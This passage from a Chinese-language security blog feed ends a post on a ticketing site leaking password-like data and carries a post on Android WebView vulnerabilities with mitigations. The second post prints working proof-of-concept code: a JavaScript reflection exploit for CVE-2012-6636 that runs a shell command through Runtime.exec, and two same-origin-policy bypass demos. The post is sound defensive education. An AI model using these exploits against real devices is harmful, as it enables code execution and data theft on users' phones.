&lt;h3 id=&quot;談駭客心理&quot;&gt;談駭客心理&lt;/h3&gt;

&lt;p&gt;很明顯的，寬宏售票洩漏密碼的狀況是工程師的小疏漏。在不知道資料庫確切位置的前提下，知道疑似資料庫密碼的東西確實也無法做什麼，頂多就是了解了一家公司制定密碼的策略。然而，看在駭客眼裡，這點疏失會代表著一個網站面對資安的態度。連顯而易見的問題都沒有注意，那後端程式應該也有可能出現漏洞。一旦駭客決定要攻擊這個網站，勢必會搬出比平常還要多的資源去嘗試，因為他們認為這個投資報酬率很高。&lt;/p&gt;

&lt;p&gt;一般駭客基本上會不斷的從所看到的網頁資訊來調整自己攻擊的強度，如果他們不斷看到了奇怪的登入畫面：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150109/kham_login_1.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150109/kham_login_1.png&quot; alt=&quot;寬宏售票登入頁面1&quot; title=&quot;寬宏售票登入頁面1&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;或是防火牆的登入畫面&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150109/kham_login_2.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150109/kham_login_2.png&quot; alt=&quot;寬宏售票登入頁面2&quot; title=&quot;寬宏售票登入頁面2&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;就很有可能會增加攻擊的力道。上面這種登入頁面就是就是一種常見的資訊洩漏，在今年台灣駭客年會的議程－「&lt;a href=&quot;https://devco.re/blog/2014/08/26/information-leakage-in-taiwan-HITCON2014/&quot;&gt;被遺忘的資訊洩漏&lt;/a&gt;」就提及了這類資訊洩漏在台灣是很普及的。注意，出現這樣的頁面並不意味著網站會有漏洞，只是網站容易因此多受到一些攻擊。反之，如果一個網站前端頁面寫的乾淨漂亮，甚至連 &lt;a href=&quot;https://devco.re/blog/2014/03/10/security-issues-of-http-headers-1/&quot;&gt;HTTP 安全 header&lt;/a&gt; 這種小細節都會注意到，駭客可能就會認為這個網站寫的很嚴謹，甚至連嘗試的慾望都沒有了。&lt;/p&gt;

&lt;p&gt;一個經驗豐富的駭客，通常光看首頁就能夠判斷該網站是否可能存有漏洞，憑藉的就是這些蛛絲馬跡。為了不讓自家網站常被路過的惡意使用者攻擊，加強網頁前端的呈現、網頁原始碼乾淨有架構、沒有太多資訊洩漏，這些都是很好的防禦方法。&lt;/p&gt;

&lt;h3 id=&quot;結論&quot;&gt;結論&lt;/h3&gt;

&lt;p&gt;在使用最近熱門的寬宏售票網站時，我們發現網頁原始碼存在一些疑似密碼的資訊。從這件事情出發，我們分別延伸探討了兩個工程師應該注意的議題：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;第一個議題提醒大家在開發的時候，重要的資訊千萬不要透過客戶端瀏覽器幫忙轉送，記住客戶端都是不可信的，多經一手就多一分風險。文中舉出了台灣電商網站在金流串接時也常出現這樣的問題，可能會造成訂單金額被竄改等企業會有所損失的問題。&lt;/li&gt;
  &lt;li&gt;第二個議題從駭客的心理來談資安，一個網站如果沒有什麼保護機制、輕易的洩漏網站資訊，非常容易挑起駭客想要嘗試入侵的慾望；反之，若一個網站從前端到使用流程都非常注意細節，一般駭客較會興致缺缺。嚴謹的前端呈現，就某種程度來說，也是一種對自身網站的保護。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;希望開發者看到上面這兩個議題有掌握到『別相信客戶端』、『駭客會因網站前端寫法不嚴謹而嘗試去攻擊』的重點，提昇自家網站的安全度吧！&lt;/p&gt;

&lt;p&gt;最後說個題外話，身為一個工程師，我認為資訊系統該帶給世界的好處是節省大家的時間，而這次搶票卻讓無數人徹夜排隊或守在電腦前不斷的『連不上、買票、失敗』循環。這也許能夠賺到大量的新聞版面，最終票也能全部賣光，但想到台灣有數十萬小時的生產力浪費在無意義的等待上，就覺得這個系統好失敗。現在的技術已經可以負荷這樣大規模的售票，&lt;a href=&quot;https://kktix.com/&quot;&gt;KKTIX&lt;/a&gt; 甚至可以&lt;a href=&quot;https://medium.com/@hlb/kktix-2015-01-7bf84c47dfdf&quot;&gt;一分鐘處理 10 萬張劃位票券&lt;/a&gt;！世界在進步，過去的技術也許就該讓它留在過去。有人說：『真正幸福的人：不是搶到票，是可以像江蕙一樣選擇人生』，希望我也可以變成一個幸福的人，可以選擇一個不塞車的售票系統。&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2015/01/09/information-security-insight-kham/</link>
                <guid>https://devco.re/blog/2015/01/09/information-security-insight-kham</guid>
                <pubDate>Fri, 09 Jan 2015 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Android WebView 為你的使用者打開了漏洞之門你知道嗎？</title>
                <description>&lt;p&gt;為了解決在應用程式中顯示網頁的需求，開發者一般會使用到由系統提供的 WebView 元件。而由於 JavaScript 被廣泛應用在網頁上，開發者通常也會把 WebView 處理 JavaScript 的功能打開，好讓大部分網頁能正常運作。但就在開啟這個像是必不可少的 JavaScript 功能時，背後一些由於系統漏洞而引發出來意想不到的風險卻有機會由此而生。接下來的部分將把這些漏洞為大家做個整理。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;相關漏洞&quot;&gt;相關漏洞&lt;/h3&gt;

&lt;h4 id=&quot;1-遠端代碼執行-remote-code-execution&quot;&gt;1. 遠端代碼執行 (Remote Code Execution)&lt;/h4&gt;

&lt;h5 id=&quot;風險木馬跳板個資被盜&quot;&gt;風險：木馬跳板，個資被盜&lt;/h5&gt;
&lt;p&gt;目前有機會發生 RCE 風險都圍繞在 &lt;a href=&quot;http://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface(java.lang.Object, java.lang.String)&quot;&gt;addJavascriptInterface&lt;/a&gt; 這個功能上，該功能原意是為被載入的網頁和原生程式間建立一個”橋樑”，通過預先設定好的介面，讓網頁能呼叫指定的公開函式並取得函式回傳的結果。&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;JsObject&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Hello World&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;webView&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getSettings&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setJavaScriptEnabled&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;webView&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;addJavascriptInterface&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;JsObject&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;injectedObject&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;webView&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;loadUrl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://www.example.com/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;…
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
       &lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;injectedObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// return &quot;Hello World&quot;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;…&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;像上面的例子裡，網頁能通過預先設定好的 “injectedObject” 介面，呼叫 “toString” 函式，得到 “Hello World” 這個字串。&lt;/p&gt;

&lt;p&gt;其漏洞 &lt;a href=&quot;http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2012-6636&quot;&gt;CVE-2012-6636&lt;/a&gt; 最早在2012年12月被&lt;a href=&quot;http://50.56.33.56/blog/?p=314&quot;&gt;公佈&lt;/a&gt;出來，攻擊者有機會利用他通過 Java Reflection API 來執行任意代碼。影響 Android 1.X ~ 4.1。&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cmdArgs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;injectedObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getClass&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;forName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;java.lang.Runtime&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                              &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getMethod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;getRuntime&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                              &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cmdArgs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/system/bin/sh&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;-c&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;cat vuln &amp;gt;&amp;gt; attacker.txt&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;其後 Google 在 Android 4.2 開始對 &lt;a href=&quot;http://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface(java.lang.Object, java.lang.String)&quot;&gt;addJavascriptInterface&lt;/a&gt; 的使用方式加了限制，使用時需要在 Java 端把可被網頁執行的公開函式透過 @JavascriptInterface 來標註。並奉勸開發者別在 4.1 或之前的系統上使用 &lt;a href=&quot;http://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface(java.lang.Object, java.lang.String)&quot;&gt;addJavascriptInterface&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;可是是否開發者只要在受影響的系統上不主動使用 &lt;a href=&quot;http://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface(java.lang.Object, java.lang.String)&quot;&gt;addJavascriptInterface&lt;/a&gt; 就能解決問題呢？答案是否定的。&lt;/p&gt;

&lt;p&gt;在 Android 3.X ~ 4.1 上，WebView 預設會用 &lt;a href=&quot;http://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface(java.lang.Object, java.lang.String)&quot;&gt;addJavascriptInterface&lt;/a&gt; 添加一個叫 “searchBoxJavaBridge_” 的介面。開發者如果沒有注意的話就會同樣會讓使用者陷入風險中。很巧合地，從 Android 3.0 開始 Google 加入了 &lt;a href=&quot;http://developer.android.com/reference/android/webkit/WebView.html#removeJavascriptInterface(java.lang.String)&quot;&gt;removeJavascriptInterface&lt;/a&gt; 函式讓開發者可以移定指定的介面。所以開發者可以使用該函式在受影響的系統上把 “searchBoxJavaBridge_” 移除。&lt;/p&gt;

&lt;p&gt;除了 “searchBoxJavaBridge_” 外，還有兩個介面會在特定情況下被加到 WebView 中。若使用者有在手機上 [系統設定] 裡的 [協助工具]，打開 [服務] 子分類中的任何一個項目，系統就會對其後建立的 WebView 自動加上 “accessibility” 和 “accessibilityTraversal”這兩個介面。這行為在 Android 4.4 由於&lt;a href=&quot;https://android.googlesource.com/platform/frameworks/base/+/94c0057d67c2e0a4b88a4f735388639210260d0e&quot;&gt;舊版 WebView 被取代&lt;/a&gt;而消失了。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20141013/android_accessibility_service.png&quot; alt=&quot;Android 協助工具服務&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;防範&quot;&gt;防範&lt;/h4&gt;

&lt;p&gt;作為開發者&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;如非需要，關閉 JavaScript 功能 (預設關閉)&lt;/li&gt;
  &lt;li&gt;可考慮把網頁當作範本儲存在應用內，再用其他途徑載入資料&lt;/li&gt;
  &lt;li&gt;在有風險的系統中停用 &lt;a href=&quot;http://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface(java.lang.Object, java.lang.String)&quot;&gt;addJavascriptInterface&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;在有風險的系統中使用 &lt;a href=&quot;http://developer.android.com/reference/android/webkit/WebView.html#removeJavascriptInterface(java.lang.String)&quot;&gt;removeJavascriptInterface&lt;/a&gt; 移除系統自帶的介面&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;作為使用者&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;如非需要，關閉 [不明的來源] 選項 (預設關閉)&lt;/li&gt;
  &lt;li&gt;使用 Android 4.2 或以上不受影響的系統&lt;/li&gt;
  &lt;li&gt;勿在受影響的系統上使用機敏服務或儲存機敏資料&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20141013/android_unknown_source.png&quot; alt=&quot;Android 不明的來源&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;2-繞過同源策略-same-origin-policy-bypass&quot;&gt;2. 繞過同源策略 (Same-Origin Policy bypass)&lt;/h4&gt;

&lt;h5 id=&quot;風險個資被盜&quot;&gt;風險：個資被盜&lt;/h5&gt;
&lt;p&gt;為防止網頁在載入外部資源時引發安全問題，瀏覽器會實作&lt;a href=&quot;https://developer.mozilla.org/zh-TW/docs/Web/JavaScript/Same_origin_policy_for_JavaScript&quot;&gt;同源策略&lt;/a&gt;以限制程式碼和不同網域資源間的互動。&lt;/p&gt;

&lt;p&gt;其中 &lt;a href=&quot;http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6041&quot;&gt;CVE-2014-6041&lt;/a&gt; 漏洞，通過程式在處理 \u0000 (unicode null byte) 時的失誤而繞過了原有的限制。&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;CVE-2014-6041 UXSS DEMO&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;iframe&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;target_frame&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://devco.re/&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;button&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;go&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;onclick=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;window.open(&apos;\u0000javascript:alert(document.domain)&apos;,
&apos;target_frame&apos;)&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;如果上面的網頁是放置在與 &lt;a href=&quot;http://devco.re/&quot;&gt;http://devco.re/&lt;/a&gt; 不同源的地方，正常來說點擊按鈕後會因為 SOP 的關係，該段 JavaScript 無法執行而不會有反應。但在受影響的環境裡則能順利執行並跳出 “devco.re” 這個網域名稱。&lt;/p&gt;

&lt;p&gt;上述問題被發現後沒多久，再由相同研究員發現一個早在多年前已經被修正的 &lt;a href=&quot;http://trac.webkit.org/changeset/96826&quot;&gt;WebKit 臭蟲&lt;/a&gt;仍然出現在 Android 4.3 及之前的版本上。&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;object&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;http://www.bing.com&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;appendChild&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;javascript:alert(document.domain)&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;innerHTML&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;foobar&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;上述的跨來源操作同樣違反了 SOP，應當被拒絕執行。但他卻能在有風險的 WebView 上被執行，造成風險。&lt;/p&gt;

&lt;h4 id=&quot;防範-1&quot;&gt;防範&lt;/h4&gt;

&lt;p&gt;作為開發者&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;如非需要，關閉 JavaScript 功能 (預設關閉)&lt;/li&gt;
  &lt;li&gt;可考慮把網頁當作範本儲存在應用內，再用其他途徑載入資料&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;作為使用者&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;如非需要，關閉 [不明的來源] 選項 (預設關閉)&lt;/li&gt;
  &lt;li&gt;使用 Android 4.4 或以上不受影響的系統&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;結語&quot;&gt;結語&lt;/h3&gt;

&lt;p&gt;談到這裡大家可能會有個疑問，如果應用程式中所載入的遠端網頁網址都是固定，受開發者控制的，應該就會安全沒有風險。還記得在 &lt;a href=&quot;http://devco.re/blog/2014/08/15/ssl-mishandling-on-mobile-app-development/&quot;&gt;被忽略的 SSL 處理&lt;/a&gt; 裡提及過的中間人攻擊嗎？如果連線過程是採用明文的 HTTP ，或是加密的 HTTPS 但沒落實做好憑證檢查，內容就有機會被攻擊者竊取修改，再結合上面提到的漏洞，對使用者帶來的影響則大大增加。&lt;/p&gt;

&lt;p&gt;下面我們製作了一段結合中間人攻擊與 addJavascriptInterface 漏洞，模擬使用者手機被入侵的影片：&lt;/p&gt;

&lt;center&gt;&lt;div class=&quot;videowrapper&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;420&quot; src=&quot;https://www.youtube.com/embed/reKEu-Ajo50&quot; frameborder=&quot;0&quot;&gt; &lt;/iframe&gt;&lt;/div&gt;&lt;/center&gt;

&lt;p&gt;從影片的最後可以看到，攻擊者取得存在漏洞的應用程式權限，並取得裡面的機敏資料。&lt;/p&gt;

&lt;p&gt;而在繞過同源策略問題上，無論是透過 null byte 或是設定屬性來達到，其實都是屬於存在已久的手法，多年前在別的平台、瀏覽器上就已經發生過，除了編寫上的疏忽外，缺乏一個完整的測試流程去做檢查相信也是其中一個原因。&lt;/p&gt;

&lt;p&gt;Android 的生態系統問題，使得大多數的使用者手機未能跟得上系統更新的步驟，讓他們即使知道自己所使用系統存在問題也愛莫能助。&lt;/p&gt;

&lt;p&gt;作為開發商，應需要在系統支援度與其相應存在的安全風險中取得平衡，來決定應用程式所支援的最低版本為何。最後作為一個負責任的開發者，應為已被公開的漏洞做好應對措施，避免使用者暴露在風險當中。&lt;/p&gt;

&lt;h3 id=&quot;參考&quot;&gt;參考&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://50.56.33.56/blog/?p=314&quot;&gt;Abusing WebView JavaScript Bridges&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.rafayhackingarticles.net/2014/08/android-browser-same-origin-policy.html&quot;&gt;Android Browser Same Origin Policy Bypass &amp;lt; 4.4 - CVE-2014-6041&lt;/a&gt;&lt;/li&gt;
